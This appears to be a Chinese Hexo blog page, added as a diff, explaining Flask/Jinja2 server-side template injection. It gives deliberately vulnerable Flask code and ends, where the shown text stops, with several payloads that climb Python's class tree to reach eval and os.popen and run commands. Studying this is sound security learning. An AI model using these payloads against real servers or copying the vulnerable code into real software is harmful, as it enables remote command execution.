@@ -1,0 +1,1491 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="FLASK模板注入(SSTI)学习, Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>FLASK模板注入(SSTI)学习 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">FLASK模板注入(SSTI)学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">FLASK模板注入(SSTI)学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.1k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="FLASK模板注入SSTI学习"><a href="#FLASK模板注入SSTI学习" class="headerlink" title="FLASK模板注入SSTI学习"></a>FLASK模板注入SSTI学习</h1><p><img src="https://i.loli.net/2020/09/07/9NDKYfcPI84ZH5M.jpg" alt="1.png"></p>
+<h2 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h2><blockquote>
+<p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
+</blockquote>
+<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
+<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
+<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
+<p>让我们用例子来简析模板渲染。</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;$what&amp;#125;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
+<p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里(后端传入)，呈现给用户类似于</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>张三<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
+<h2 id="了解route装饰器路由"><a href="#了解route装饰器路由" class="headerlink" title="了解route装饰器路由"></a>了解route装饰器路由</h2><p>使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，例如</p>
+<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>"
+   <span class="token keyword">return</span> <span class="token number">123</span></code></pre>
+<p>当我们访问根目录的时候就会输出123，再修改一下规则</p>
+<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>"
+   <span class="token keyword">return</span> <span class="token number">123</span></code></pre>
+<p>此时访问<code>127.0.0.1/test</code>就会输出123</p>
+<p>还可以设置参数之类</p>
+<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/hello/&lt;username>"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">return</span> <span class="token string">"user:%s"</span><span class="token operator">%</span>username</code></pre>
+<p>此时访问<code>127.0.0.1/hello/zhi</code>，这时会输出user:zhi</p>
+<h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><pre class=" language-python"><code class="language-python">在jinja2中，存在三种语句：控制结构 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;%　%&amp;#125;、变量取值 &amp;#123;&amp;#123;　&amp;#125;&amp;#125;、注释 &amp;#123;#　#&amp;#125;</span>
+
+jinja2模板中使用 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;　&amp;#125;&amp;#125; 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换</span>
+
+在Jinja2引擎中，<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#123;　&amp;#125;&amp;#125;不仅仅是变量标示符，也能执行一些简单的表达式</span></code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string
+
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
+    html <span class="token operator">=</span> <span class="token string">'&lt;html>%s&lt;/html>'</span>
+    <span class="token keyword">return</span> html<span class="token operator">%</span>code</code></pre>
+<ul>
+<li>此时获取到用户传入的数据，也就是test，然后渲染给前端，此时参数是用户可控的，直接渲染就会造成安全隐患。</li>
+<li>flask使用的渲染引擎是<code>Jinja2</code>，我们可以直接return一些HTML代码来实现网页的格式化，但是这样会导致XSS漏洞。</li>
+<li>为了避免XSS，可以使用<code>render_tempplate_string</code>对输入的文本进行渲染。</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string
+
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    html<span class="token operator">=</span><span class="token string">'&lt;html>&amp;#123;&amp;#123;var&amp;#125;&amp;#125;&lt;html>'</span>
+    test <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">,</span>var<span class="token operator">=</span>test<span class="token punctuation">)</span></code></pre>
+<ul>
+<li>如果我们自己写一个HTML文件会有点复杂，需要的时间会比较长，我们可以借助<code>render_template</code>从<code>templates</code>文件夹中加载我们想要的html文件，然后对里面的内容进行修改输出。</li>
+<li><code>render_template</code>函数渲染的<code>templates</code>文件中的HTML，当然也可以把我们自己写的页面放在里面，然后去引用。</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template
+
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>var<span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">)</span></code></pre>
+<ul>
+<li>使用<code>render_template</code>函数引用了<code>templates</code>文件夹下面的index.html模板，然后传入一个参数var，用来控制模板中的。</li>
+</ul>
+<h2 id="漏洞形成的原因"><a href="#漏洞形成的原因" class="headerlink" title="漏洞形成的原因"></a>漏洞形成的原因</h2><p>将参数当字符串来渲染并且使用了%(request.url)导致模版渲染可控时，用户输入恶意代码导致漏洞形成</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    template <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+        &lt;div class="center-content error">
+            &lt;h1>Oops! That page doesn't exist.&lt;/h1>
+            &lt;h3>%s&lt;/h3>
+        &lt;/div> 
+    '''</span> <span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>漏洞代码使用了<code>render_template_string</code>函数，而如果使用<code>render_template</code>函数，将变量传入进去，经过固定模版的渲染便不可控了</p>
+<p>比如我们把最后return语句改成</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">,</span>user<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>此时使用<code>render_template</code>函数，变量中有用户可以直接控制的参数，假如用户输入恶意代码也不会执行，因为已经被<code>render_template</code>函数渲染了，只会原样输出。</p>
+<p>了解一下payload形成的原理</p>
+<ul>
+<li><code>__class__</code>返回调用的参数类型。</li>
+<li><code>__base__</code>返回基类 </li>
+<li><code>__mro__</code>允许我们在当前Python环境下追溯继承树 </li>
+<li><code>__subclasses__()</code>返回子类</li>
+<li><code>__globals__</code>以dict形式返回函数所在模块命名空间中的所有变量。</li>
+<li>找到重载过的<code>__init__</code>类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</li>
+<li><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于<strong>builtins</strong>却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</li>
+</ul>
+<p>主要是利用<code>__builtins__</code>中的函数进行文件读取利用等等，而含有<code>__builtins__</code>的内建函数有这些：</p>
+<blockquote>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">)</span></code></pre>
+</blockquote>
+<p>内建函数还有<code>os</code>和<code>linechache</code></p>
+<p><code>os._wrap_close类里有popen（python2不行）</code>、<code>linecache类里有os</code>、<code>__import__类里有os</code>、<code>__builtins__类里有eval，__import__等函数</code></p>
+<p>比如：<code>__builtins__</code>类里有<code>eval、__import__</code>等函数，可以利用此来执行命令</p>
+<pre class=" language-python"><code class="language-python"><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span>
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span>
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
